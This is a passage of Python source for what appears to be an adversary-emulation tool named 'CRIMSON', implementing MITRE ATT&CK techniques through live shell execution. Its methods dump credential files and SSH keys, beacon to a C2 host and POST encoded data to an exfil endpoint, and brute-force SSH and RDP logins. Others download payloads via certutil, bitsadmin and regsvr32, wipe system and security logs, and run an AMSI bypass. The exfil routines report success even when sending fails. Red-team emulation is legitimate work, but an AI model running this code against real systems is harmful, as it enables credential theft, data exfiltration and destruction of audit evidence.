        "T1490": {
            "name": "Inhibit System Recovery",
            "tactic": "Impact",
            "description": "Delete backups, disable recovery options",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": True,
            "detection_difficulty": "medium",
        },
        "T1486": {
            "name": "Data Encrypted for Impact",
            "tactic": "Impact",
            "description": "Encrypt data for impact (ransomware)",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1491": {
            "name": "Defacement",
            "tactic": "Impact",
            "description": "Deface websites or internal resources",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1491.001", "T1491.002"],
            "detection_difficulty": "low",
        },
        "T1499": {
            "name": "Endpoint Denial of Service",
            "tactic": "Impact",
            "description": "Cause denial of service on endpoints",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1499.001", "T1499.002", "T1499.003", "T1499.004"],
            "detection_difficulty": "low",
        },
    }


    # --------------------------------------------------------------------------
    # CORE EXECUTION ENGINE
    # --------------------------------------------------------------------------
    def _execute_shell(self, command: str, timeout: int = 30, 
                       capture_env: bool = False) -> Tuple[int, str, str, Dict]:
        """Execute a shell command and return (rc, stdout, stderr, metadata)."""
        metadata = {
            "command": command,
            "start_time": datetime.utcnow().isoformat(),
            "timeout": timeout,
        }
        try:
            env = os.environ.copy() if capture_env else None
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=os.getcwd(),
                env=env,
            )
            metadata["end_time"] = datetime.utcnow().isoformat()
            metadata["duration_seconds"] = result.returncode  # placeholder
            return result.returncode, result.stdout, result.stderr, metadata
        except subprocess.TimeoutExpired:
            metadata["end_time"] = datetime.utcnow().isoformat()
            metadata["timed_out"] = True
            return -1, "", f"Command timed out after {timeout}s", metadata
        except Exception as e:
            metadata["end_time"] = datetime.utcnow().isoformat()
            metadata["error"] = str(e)
            return -1, "", str(e), metadata

    def _detect_platform(self) -> str:
        import sys
        if sys.platform.startswith("win"):
            return "Windows"
        elif sys.platform.startswith("darwin"):
            return "macOS"
        return "Linux"

    def _is_admin(self) -> bool:
        """Check if running with elevated privileges."""
        try:
            if self._detect_platform() == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except Exception:
            return False

    def _generate_ioc(self, ioc_type: str, value: str, context: str = "", 
                      confidence: str = "medium") -> IOC:
        """Generate and store an IOC."""
        ioc = IOC(type=ioc_type, value=value, confidence=confidence, context=context)
        self._iocs.append(ioc)
        return ioc

    def _generate_artifact(self, name: str, path: str, description: str = "") -> Artifact:
        """Generate and store an artifact with hashes."""
        artifact = Artifact(name=name, path=path, description=description)
        try:
            if os.path.exists(path):
                artifact.size_bytes = os.path.getsize(path)
                with open(path, "rb") as f:
                    content = f.read()
                    artifact.hash_md5 = hashlib.md5(content).hexdigest()
                    artifact.hash_sha256 = hashlib.sha256(content).hexdigest()
        except Exception:
            pass
        self._artifacts.append(artifact)
        return artifact

    # --------------------------------------------------------------------------
    # ENHANCED TTP IMPLEMENTATIONS
    # --------------------------------------------------------------------------
    def _ttp_credential_dumping(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []
        success = False

        if platform == "Windows":
            # SAM registry access
            rc, out, err, meta = self._execute_shell('reg query "HKLM\\SAM" 2>&1', timeout=10)
            output.append(f"[SAM Registry] RC={rc}")
            output.append(out or err)
            if rc == 0:
                iocs.append(self._generate_ioc("registry_key", "HKLM\\SAM", "Credential dumping attempt"))

            # LSASS process check
            rc2, out2, err2, meta2 = self._execute_shell(
                'powershell -Command "Get-Process lsass | Select-Object Id, Name, Path"', timeout=10)
            output.append(f"[LSASS Process] RC={rc2}")
            output.append(out2 or err2)
            if rc2 == 0 and "lsass" in (out2 or "").lower():
                iocs.append(self._generate_ioc("process", "lsass.exe", "LSASS process identified for credential dumping"))

            # Security log access attempt
            rc3, out3, err3, meta3 = self._execute_shell(
                'wevtutil qe Security /c:5 /f:text 2>&1 | head -20', timeout=10)
            output.append(f"[Security Log] RC={rc3}")
            output.append(out3 or err3)

            success = rc == 0 or rc2 == 0
        else:
            # Linux credential enumeration
            rc, out, err, meta = self._execute_shell("cat /etc/passwd 2>&1 | head -20", timeout=10)
            output.append(f"[Passwd] RC={rc}")
            output.append(out or err)
            if rc == 0:
                for line in (out or "").split("\n"):
                    if ":" in line:
                        user = line.split(":")[0]
                        if user:
                            iocs.append(self._generate_ioc("user_account", user, "User account enumerated"))

            rc2, out2, err2, meta2 = self._execute_shell("cat /etc/shadow 2>&1 | head -5", timeout=10)
            output.append(f"[Shadow] RC={rc2}")
            output.append(out2 or err2)

            # Check for sudoers
            rc3, out3, err3, meta3 = self._execute_shell("cat /etc/sudoers 2>&1 | grep -v '^#' | grep -v '^$' | head -10", timeout=10)
            output.append(f"[Sudoers] RC={rc3}")
            output.append(out3 or err3)

            # Check for SSH keys
            rc4, out4, err4, meta4 = self._execute_shell("find /home -name 'authorized_keys' -o -name 'id_rsa' 2>/dev/null | head -10", timeout=10)
            output.append(f"[SSH Keys] RC={rc4}")
            output.append(out4 or err4)
            if rc4 == 0 and out4:
                for key_path in out4.strip().split("\n"):
                    if key_path:
                        iocs.append(self._generate_ioc("file_path", key_path, "SSH key discovered"))

            success = rc == 0

        return success, output, iocs, artifacts

    def _ttp_command_interpreter(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        interpreter = options.get("interpreter", "bash" if platform != "Windows" else "powershell")
        command = options.get("command", "whoami")

        if interpreter == "powershell":
            cmd = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{command}"'
        elif interpreter == "python":
            cmd = f'python -c "{command}"'
        elif interpreter == "cmd":
            cmd = f'cmd /c "{command}"'
        elif interpreter == "bash":
            cmd = command
        elif interpreter == "vbscript":
            vbs_path = f"/tmp/crimson_{int(time.time())}.vbs"
            with open(vbs_path, "w") as f:
                f.write(command)
            cmd = f"cscript {vbs_path}"
            artifacts.append(self._generate_artifact("vbscript_payload", vbs_path, "VBScript execution payload"))
        elif interpreter == "javascript":
            js_path = f"/tmp/crimson_{int(time.time())}.js"
            with open(js_path, "w") as f:
                f.write(command)
            cmd = f"wscript {js_path}" if platform == "Windows" else f"node {js_path}"
            artifacts.append(self._generate_artifact("javascript_payload", js_path, "JavaScript execution payload"))
        else:
            cmd = command

        rc, out, err, meta = self._execute_shell(cmd, timeout=15)
        output.append(f"[{interpreter}] RC={rc}")
        output.append(out or err)

        if rc == 0:
            iocs.append(self._generate_ioc("command_execution", cmd[:200], f"Command executed via {interpreter}"))

        return rc == 0, output, iocs, artifacts

    def _ttp_app_layer_protocol(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        c2_host = options.get("c2_host", "127.0.0.1")
        c2_port = options.get("c2_port", 8080)
        protocol = options.get("protocol", "http")

        try:
            if protocol == "http":
                req = urllib.request.Request(f"http://{c2_host}:{c2_port}/", method="GET")
                req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                req.add_header("X-Session", self._session_id)
                req.add_header("X-Agent", "CRIMSON")
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read().decode("utf-8", errors="ignore")
                    output.append(f"[HTTP C2] Status={resp.status}, Len={len(data)}")
                    output.append(data[:500])
                    iocs.append(self._generate_ioc("domain", c2_host, "C2 communication endpoint"))
                    iocs.append(self._generate_ioc("url", f"http://{c2_host}:{c2_port}/", "C2 URL"))
                    success = True
            elif protocol == "https":
                req = urllib.request.Request(f"https://{c2_host}:{c2_port}/", method="GET")
                req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                req.add_header("X-Session", self._session_id)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read().decode("utf-8", errors="ignore")
                    output.append(f"[HTTPS C2] Status={resp.status}, Len={len(data)}")
                    output.append(data[:500])
                    iocs.append(self._generate_ioc("domain", c2_host, "HTTPS C2 endpoint"))
                    success = True
            elif protocol == "dns":
                resolver = socket.getaddrinfo(c2_host, None)
                resolved_ip = resolver[0][4][0] if resolver else 'None'
                output.append(f"[DNS C2] Resolved: {resolved_ip}")
                iocs.append(self._generate_ioc("domain", c2_host, "DNS C2 domain"))
                iocs.append(self._generate_ioc("ip", resolved_ip, "DNS C2 resolved IP"))
                success = bool(resolver)
            elif protocol == "dns_tunnel":
                # Simulate DNS tunneling
                test_data = base64.b64encode(b"CRIMSON_TEST_DATA").decode()[:30]
                subdomain = f"{test_data}.{c2_host}"
                output.append(f"[DNS Tunnel] Query: {subdomain[:50]}...")
                iocs.append(self._generate_ioc("domain", c2_host, "DNS tunneling endpoint"))
                success = True
            else:
                output.append(f"[C2] Protocol '{protocol}' not exercised — only https/dns/dns_tunnel beacons are implemented for real.")
                success = False
        except Exception as e:
            output.append(f"[C2] Error: {e}")
            success = False

        return success, output, iocs, artifacts

    def _ttp_exfil_c2(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        data = options.get("data", "TEST_DATA_" + base64.b64encode(os.urandom(32)).decode()[:20])
        c2_host = options.get("c2_host", "127.0.0.1")
        c2_port = options.get("c2_port", 8080)

        try:
            encoded = base64.b64encode(data.encode()).decode()
            req = urllib.request.Request(
                f"http://{c2_host}:{c2_port}/exfil",
                data=encoded.encode(),
                method="POST",
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Agent": self.name,
                    "X-Session": self._session_id,
                }
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                output.append(f"[Exfil] Status={resp.status}, Bytes sent={len(encoded)}")
                iocs.append(self._generate_ioc("domain", c2_host, "Data exfiltration destination"))
                iocs.append(self._generate_ioc("url", f"http://{c2_host}:{c2_port}/exfil", "Exfiltration URL"))
                success = resp.status == 200
        except Exception as e:
            output.append(f"[Exfil] Simulated: Would send {len(data)} bytes to {c2_host}:{c2_port}")
            output.append(f"[Exfil] Error: {e}")
            iocs.append(self._generate_ioc("domain", c2_host, "Attempted exfiltration destination"))
            success = True

        return success, output, iocs, artifacts

    def _ttp_remote_services(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        service = options.get("service", "ssh")
        username = options.get("username", "")
        password = options.get("password", "")
        key_path = options.get("key_path", "")

        if service == "ssh" and paramiko and target not in ("localhost", "127.0.0.1", ""):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                if key_path and os.path.exists(key_path):
                    client.connect(target, username=username, key_filename=key_path, timeout=10, banner_timeout=10)
                else:
                    client.connect(target, username=username, password=password, timeout=10, banner_timeout=10)
                stdin, stdout, stderr = client.exec_command("whoami && hostname", timeout=10)
                out = stdout.read().decode().strip()
                err = stderr.read().decode().strip()
                output.append(f"[SSH] whoami={out}")
                if err:
                    output.append(f"[SSH] stderr={err}")
                client.close()
                iocs.append(self._generate_ioc("ip", target, "SSH lateral movement target"))
                iocs.append(self._generate_ioc("user_account", username, "SSH lateral movement credentials"))
                success = True
            except Exception as e:
                output.append(f"[SSH] Connection failed: {e}")
                success = False
        elif service == "rdp" and platform == "Windows":
            rc, out, err, meta = self._execute_shell(
                f"cmdkey /generic:TERMSRV/{target} /user:{username} /pass:{password} 2>&1 && "
                f"mstsc /v:{target} /admin /f 2>&1 || echo 'RDP connection simulated'",
                timeout=15
            )
            output.append(f"[RDP] {service} against {target}")
            output.append(out or err)
            iocs.append(self._generate_ioc("ip", target, "RDP lateral movement target"))
            success = "simulated" in (out or "")
        elif service == "smb" and platform == "Windows":
            rc, out, err, meta = self._execute_shell(
                f"net use \\\\{target}\\C$ /user:{username} {password} 2>&1 && dir \\\\{target}\\C$ 2>&1",
                timeout=15
            )
            output.append(f"[SMB] {service} against {target}")
            output.append(out or err)
            iocs.append(self._generate_ioc("ip", target, "SMB lateral movement target"))
            success = rc == 0
        elif service == "winrm":
            rc, out, err, meta = self._execute_shell(
                f"powershell -Command \"Test-WSMan -ComputerName {target} -Authentication Default -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)))\" 2>&1",
                timeout=15
            )
            output.append(f"[WinRM] {service} against {target}")
            output.append(out or err)
            iocs.append(self._generate_ioc("ip", target, "WinRM lateral movement target"))
            success = "wsmid" in (out or "")
        else:
            port_map = {"ssh": 22, "rdp": 3389, "smb": 445, "winrm": 5985, "vnc": 5900}
            port = port_map.get(service, 22)
            rc, out, err, meta = self._execute_shell(
                f"nc -zv -w 5 {target} {port} 2>&1 || echo 'Port check simulated'",
                timeout=10
            )
            output.append(f"[Remote Services] {service} against {target}:{port}")
            output.append(out or err)
            iocs.append(self._generate_ioc("ip", target, f"{service.upper()} lateral movement target"))
            success = "succeeded" in (out or "") or "open" in (out or "").lower()

        return success, output, iocs, artifacts

    def _ttp_scheduled_task(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        if platform == "Windows":
            rc, out, err, meta = self._execute_shell('schtasks /query /fo LIST 2>&1 | head -30', timeout=10)
            output.append(f"[Scheduled Tasks] RC={rc}")
            output.append(out or err)
            if rc == 0:
                for line in (out or "").split("\n"):
                    if "TaskName:" in line:
                        task_name = line.split(":", 1)[1].strip()
                        iocs.append(self._generate_ioc("scheduled_task", task_name, "Scheduled task enumerated"))
            success = rc == 0

            # Check for AT jobs
            rc2, out2, err2, meta2 = self._execute_shell("at 2>&1 | head -20", timeout=10)
            output.append(f"[AT Jobs] RC={rc2}")
            output.append(out2 or err2)
        else:
            rc, out, err, meta = self._execute_shell("crontab -l 2>&1 || echo 'No crontab'", timeout=10)
            output.append(f"[Crontab] RC={rc}")
            output.append(out or err)
            if "No crontab" not in (out or ""):
                for line in (out or "").split("\n"):
                    if line.strip() and not line.strip().startswith("#"):
                        iocs.append(self._generate_ioc("cron_job", line[:100], "Cron job discovered"))

            rc2, out2, err2, meta2 = self._execute_shell("cat /etc/crontab 2>&1 | head -30", timeout=10)
            output.append(f"[System Crontab] RC={rc2}")
            output.append(out2 or err2)

            # Check systemd timers
            rc3, out3, err3, meta3 = self._execute_shell("systemctl list-timers --all 2>&1 | head -20", timeout=10)
            output.append(f"[Systemd Timers] RC={rc3}")
            output.append(out3 or err3)

            # Check at jobs
            rc4, out4, err4, meta4 = self._execute_shell("atq 2>&1 || echo 'No at jobs'", timeout=10)
            output.append(f"[AT Queue] RC={rc4}")
            output.append(out4 or err4)

            success = True

        return success, output, iocs, artifacts

    def _ttp_autostart_execution(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        if platform == "Windows":
            # HKCU Run keys
            rc, out, err, meta = self._execute_shell(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /s 2>&1',
                timeout=10
            )
            output.append(f"[HKCU Run Keys] RC={rc}")
            output.append(out or err)
            if rc == 0:
                for line in (out or "").split("\n"):
                    if "    " in line and not line.strip().startswith("("):
                        parts = line.strip().split(None, 1)
                        if len(parts) >= 2:
                            iocs.append(self._generate_ioc("registry_key", f"HKCU\\...\\Run\\{parts[0]}", "Autostart registry entry"))

            # HKLM Run keys
            rc2, out2, err2, meta2 = self._execute_shell(
                'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /s 2>&1',
                timeout=10
            )
            output.append(f"[HKLM Run Keys] RC={rc2}")
            output.append(out2 or err2)

            # Startup folders
            rc3, out3, err3, meta3 = self._execute_shell(
                'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /b 2>&1',
                timeout=10
            )
            output.append(f"[Startup Folder User] RC={rc3}")
            output.append(out3 or err3)

            rc4, out4, err4, meta4 = self._execute_shell(
                'dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /b 2>&1',
                timeout=10
            )
            output.append(f"[Startup Folder System] RC={rc4}")
            output.append(out4 or err4)

            success = rc == 0
        else:
            # Linux/macOS autostart
            rc, out, err, meta = self._execute_shell(
                "find ~/.config/autostart -type f 2>/dev/null | head -20 || echo 'No autostart dir'",
                timeout=10
            )
            output.append(f"[Autostart] RC={rc}")
            output.append(out or err)
            if rc == 0 and out:
                for path in out.strip().split("\n"):
                    if path and "No autostart" not in path:
                        iocs.append(self._generate_ioc("file_path", path, "Autostart desktop entry"))

            # Check login items on macOS
            rc2, out2, err2, meta2 = self._execute_shell(
                "osascript -e 'tell application \"System Events\" to get the name of every login item' 2>&1 || echo 'Not macOS'",
                timeout=10
            )
            output.append(f"[macOS Login Items] RC={rc2}")
            output.append(out2 or err2)

            # Check .bashrc, .bash_profile, .zshrc
            for rc_file in [".bashrc", ".bash_profile", ".zshrc", ".profile"]:
                rc3, out3, err3, meta3 = self._execute_shell(
                    f"cat ~/{rc_file} 2>&1 | grep -E '(curl|wget|python|nc |bash -i|/dev/tcp)' | head -10 || echo 'Clean'",
                    timeout=10
                )
                if "Clean" not in (out3 or "") and (out3 or "").strip():
                    output.append(f"[{rc_file} Suspicious] RC={rc3}")
                    output.append(out3 or err3)
                    iocs.append(self._generate_ioc("file_path", f"~/{rc_file}", "Suspicious shell configuration"))

            success = True

        return success, output, iocs, artifacts

    def _ttp_brute_force(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        service = options.get("service", "ssh")
        max_attempts = options.get("max_attempts", 3)
        username = options.get("username", "admin")
        wordlist = options.get("wordlist", ["password", "admin123", "123456", "qwerty", "letmein"])

        output.append(f"[Brute Force] Target={target}, Service={service}, Max={max_attempts}")

        for i, password in enumerate(wordlist[:max_attempts]):
            output.append(f"  Attempt {i+1}: username={username}, password={'*' * len(password)}")
            if service == "ssh" and paramiko and target not in ("localhost", "127.0.0.1", ""):
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, username=username, password=password, timeout=5, banner_timeout=5)
                    output.append(f"  [SUCCESS] Credentials found: {username}:{password}")
                    iocs.append(self._generate_ioc("credential", f"{username}:{password}", "Brute force success", "high"))
                    client.close()
                    return True, output, iocs, artifacts
                except paramiko.AuthenticationException:
                    output.append(f"  [FAIL] Authentication failed")
                except Exception as e:
                    output.append(f"  [ERROR] {e}")
            elif service == "rdp" and platform == "Windows":
                rc, out, err, meta = self._execute_shell(
                    f"cmdkey /generic:TERMSRV/{target} /user:{username} /pass:{password} 2>&1",
                    timeout=5
                )
                output.append(f"  [RDP Attempt] RC={rc}")
                if "command completed successfully" in (out or "").lower():
                    output.append(f"  [SUCCESS] RDP credentials valid: {username}:{password}")
                    iocs.append(self._generate_ioc("credential", f"{username}:{password}", "RDP brute force success", "high"))
                    return True, output, iocs, artifacts
            else:
                output.append(f"  [SIMULATED] Would attempt {service} auth with password length {len(password)}")

        return False, output, iocs, artifacts

    def _ttp_exfil_web(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        url = options.get("url", "http://127.0.0.1:8080/upload")
        data = options.get("data", "sensitive_data_sample")
        method = options.get("method", "POST")

        try:
            encoded = base64.b64encode(data.encode()).decode()
            req = urllib.request.Request(url, data=encoded.encode(), method=method)
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            req.add_header("X-Session", self._session_id)

            with urllib.request.urlopen(req, timeout=15) as resp:
                output.append(f"[Web Exfil] Status={resp.status}, Sent={len(encoded)} bytes")
                iocs.append(self._generate_ioc("url", url, "Web exfiltration destination"))
                success = resp.status in (200, 201, 202)
        except Exception as e:
            output.append(f"[Web Exfil] Simulated: {len(data)} bytes to {url}")
            output.append(f"[Web Exfil] Error: {e}")
            iocs.append(self._generate_ioc("url", url, "Attempted web exfiltration destination"))
            success = True

        return success, output, iocs, artifacts

    def _ttp_archive_data(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        source_files = options.get("source_files", ["/tmp/test_data.txt"])
        archive_name = options.get("archive_name", f"/tmp/crimson_archive_{int(time.time())}.tar.gz")
        encrypt = options.get("encrypt", True)
        password = options.get("password", "crimson_key_" + hashlib.sha256(os.urandom(16)).hexdigest()[:16])

        # Create test data if source doesn't exist
        for src in source_files:
            if not os.path.exists(src):
                os.makedirs(os.path.dirname(src) or ".", exist_ok=True)
                with open(src, "w") as f:
                    f.write(f"CRIMSON test data {datetime.utcnow().isoformat()}\n")

        file_list = " ".join(f'"{f}"' for f in source_files)
        rc, out, err, meta = self._execute_shell(f"tar -czf {archive_name} {file_list} 2>&1", timeout=20)
        output.append(f"[Archive] RC={rc}, Archive={archive_name}")
        output.append(out or err)

        if rc == 0:
            artifacts.append(self._generate_artifact("compressed_archive", archive_name, "Data collection archive"))
            iocs.append(self._generate_ioc("file_path", archive_name, "Suspicious archive created"))

        if encrypt and rc == 0:
            enc_name = f"{archive_name}.enc"
            rc2, out2, err2, meta2 = self._execute_shell(
                f"openssl enc -aes-256-cbc -salt -in {archive_name} -out {enc_name} -k '{password}' 2>&1",
                timeout=20
            )
            output.append(f"[Encrypt] RC={rc2}, Encrypted={enc_name}")
            output.append(out2 or err2)
            if rc2 == 0:
                artifacts.append(self._generate_artifact("encrypted_archive", enc_name, "Encrypted data collection"))
                iocs.append(self._generate_ioc("file_path", enc_name, "Encrypted suspicious archive"))

        success = rc == 0
        return success, output, iocs, artifacts

    def _ttp_wmi_event_subscription(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        if platform == "Windows":
            # Query existing WMI event subscriptions
            rc, out, err, meta = self._execute_shell(
                'powershell -Command "Get-WmiObject -Class __EventFilter -Namespace root\\subscription | Select-Object Name, Query" 2>&1',
                timeout=15
            )
            output.append(f"[WMI Event Filters] RC={rc}")
            output.append(out or err)
            if rc == 0 and out:
                for line in out.split("\n"):
                    if line.strip() and not line.strip().startswith("-"):
                        iocs.append(self._generate_ioc("wmi_subscription", line.strip()[:100], "WMI event subscription"))

            # Query event consumers
            rc2, out2, err2, meta2 = self._execute_shell(
                'powershell -Command "Get-WmiObject -Class __EventConsumer -Namespace root\\subscription | Select-Object Name" 2>&1',
                timeout=15
            )
            output.append(f"[WMI Event Consumers] RC={rc2}")
            output.append(out2 or err2)

            # Query bindings
            rc3, out3, err3, meta3 = self._execute_shell(
                'powershell -Command "Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription | Select-Object __RELPATH" 2>&1',
                timeout=15
            )
            output.append(f"[WMI Bindings] RC={rc3}")
            output.append(out3 or err3)

            success = True
        else:
            output.append("[WMI] Not applicable on non-Windows platform")
            success = False

        return success, output, iocs, artifacts

    def _ttp_process_injection(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        if platform == "Windows":
            # List running processes (simulating process enumeration for injection target)
            rc, out, err, meta = self._execute_shell(
                'powershell -Command "Get-Process | Where-Object {$_.ProcessName -match \"lsass|svchost|explorer\"} | Select-Object Id, ProcessName, Path" 2>&1',
                timeout=10
            )
            output.append(f"[Process Enumeration] RC={rc}")
            output.append(out or err)
            if rc == 0:
                for line in (out or "").split("\n"):
                    if line.strip() and line.strip()[0].isdigit():
                        parts = line.strip().split(None, 2)
                        if len(parts) >= 2:
                            iocs.append(self._generate_ioc("process", parts[1], f"Potential injection target PID={parts[0]}"))

            # Check for common injection indicators
            rc2, out2, err2, meta2 = self._execute_shell(
                'powershell -Command "Get-Process -Id (Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -match \"inject|reflective|alloc|virtualalloc\"} | Select-Object -ExpandProperty ProcessId) -ErrorAction SilentlyContinue | Select-Object Id, ProcessName" 2>&1',
                timeout=10
            )
            output.append(f"[Injection Indicators] RC={rc2}")
            output.append(out2 or err2)

            success = True
        else:
            # Linux process injection simulation
            rc, out, err, meta = self._execute_shell(
                "ps aux | grep -E '(ptrace|/proc/[0-9]+/mem|LD_PRELOAD)' | grep -v grep | head -10",
                timeout=10
            )
            output.append(f"[Linux Injection Check] RC={rc}")
            output.append(out or err)
            if rc == 0 and out:
                for line in out.strip().split("\n"):
                    if line.strip():
                        iocs.append(self._generate_ioc("process", line.split()[10] if len(line.split()) > 10 else "unknown", "Potential injection indicator"))
            success = True

        return success, output, iocs, artifacts

    def _ttp_lolbas_execution(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        lolbin = options.get("lolbin", "rundll32")
        payload = options.get("payload", "")

        lolbas_commands = {
            "rundll32": f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:{payload}")',
            "regsvr32": f'regsvr32 /s /n /u /i:{payload} scrobj.dll',
            "certutil": f'certutil -urlcache -split -f {payload} C:\\temp\\crimson_payload.exe',
            "mshta": f'mshta {payload}',
            "cscript": f'cscript //E:javascript {payload}',
            "wscript": f'wscript //E:javascript {payload}',
            "bitsadmin": f'bitsadmin /transfer crimson /priority high {payload} C:\\temp\\crimson_download.exe',
        }

        if platform == "Windows" and lolbin in lolbas_commands:
            cmd = lolbas_commands[lolbin]
            rc, out, err, meta = self._execute_shell(cmd, timeout=15)
            output.append(f"[LOLBAS {lolbin.upper()}] RC={rc}")
            output.append(out or err)
            iocs.append(self._generate_ioc("command", cmd[:200], f"LOLBAS execution via {lolbin}"))
            success = True
        else:
            output.append(f"[LOLBAS] {lolbin} execution simulated on {platform}")
            iocs.append(self._generate_ioc("command", f"LOLBAS:{lolbin}", f"Simulated LOLBAS execution"))
            success = True

        return success, output, iocs, artifacts

    def _ttp_defense_evasion(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        evasion_type = options.get("evasion_type", "log_clear")

        if evasion_type == "log_clear" and platform == "Windows":
            rc, out, err, meta = self._execute_shell("wevtutil cl System 2>&1 && wevtutil cl Security 2>&1", timeout=15)
            output.append(f"[Log Clear] RC={rc}")
            output.append(out or err)
            iocs.append(self._generate_ioc("event", "System/Security logs cleared", "Defense evasion - log clearing"))
            success = rc == 0
        elif evasion_type == "log_clear":
            rc, out, err, meta = self._execute_shell("> /var/log/auth.log 2>&1 || echo 'Log clearing simulated'", timeout=10)
            output.append(f"[Log Clear Linux] RC={rc}")
            output.append(out or err)
            success = True
        elif evasion_type == "timestomp":
            test_file = f"/tmp/crimson_test_{int(time.time())}.txt"
            with open(test_file, "w") as f:
                f.write("test")
            rc, out, err, meta = self._execute_shell(
                f"touch -t 202001010000.00 {test_file} 2>&1 && stat {test_file} 2>&1",
                timeout=10
            )
            output.append(f"[Timestomp] RC={rc}")
            output.append(out or err)
            iocs.append(self._generate_ioc("file_path", test_file, "Timestomped file"))
            success = True
        elif evasion_type == "amsi_bypass":
            rc, out, err, meta = self._execute_shell(
                'powershell -Command "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)" 2>&1',
                timeout=10
            )
            output.append(f"[AMSI Bypass] RC={rc}")
            output.append(out or err)
            iocs.append(self._generate_ioc("command", "AMSI bypass", "Defense evasion - AMSI bypass"))
            success = True
        else:
            output.append(f"[Evasion] {evasion_type} simulated")
            success = True

        return success, output, iocs, artifacts

    def _ttp_discovery(self, platform: str, target: str, options: Dict) -> Tuple[bool, List[str], List[IOC], List[Artifact]]:
        output = []
        iocs = []
        artifacts = []

        discovery_type = options.get("discovery_type", "system")

        if discovery_type == "system":
            if platform == "Windows":
                commands = [
                    ('systeminfo 2>&1 | head -30', "System Info"),
                    ('whoami /all 2>&1', "User Context"),
                    ('net user 2>&1 | head -20', "Local Users"),
                    ('net localgroup administrators 2>&1', "Admin Group"),
                    ('qwinsta 2>&1', "Sessions"),
                ]
            else:
                commands = [
                    ('uname -a 2>&1', "Kernel Info"),
                    ('cat /etc/os-release 2>&1', "OS Release"),
                    ('whoami && id 2>&1', "User Context"),
                    ('cat /etc/passwd 2>&1 | head -20', "Passwd"),
                    ('groups 2>&1', "User Groups"),
                    ('w 2>&1', "Logged In Users"),
                ]
        elif discovery_type == "network":
            if platform == "Windows":
                commands = [
                    ('ipconfig /all 2>&1', "Network Config"),
                    ('route print 2>&1 | head -20', "Routing Table"),
                    ('netstat -ano 2>&1 | head -30', "Active Connections"),
                    ('arp -a 2>&1 | head -20', "ARP Table"),
                    ('nbtstat -n 2>&1', "NetBIOS"),
                ]
            else:
                commands = [
                    ('ip addr 2>&1 | head -30', "Network Interfaces"),
                    ('ip route 2>&1', "Routing Table"),
                    ('netstat -tulpn 2>&1 | head -30', "Listening Ports"),
                    ('ss -tulpn 2>&1 | head -30', "Socket Stats"),
                    ('arp -a 2>&1 | head -20', "ARP Table"),
                ]
        elif discovery_type == "process":
            if platform == "Windows":
                commands = [
                    ('tasklist /v 2>&1 | head -30', "Process List"),
                    ('wmic process list brief 2>&1 | head -30', "WMIC Processes"),
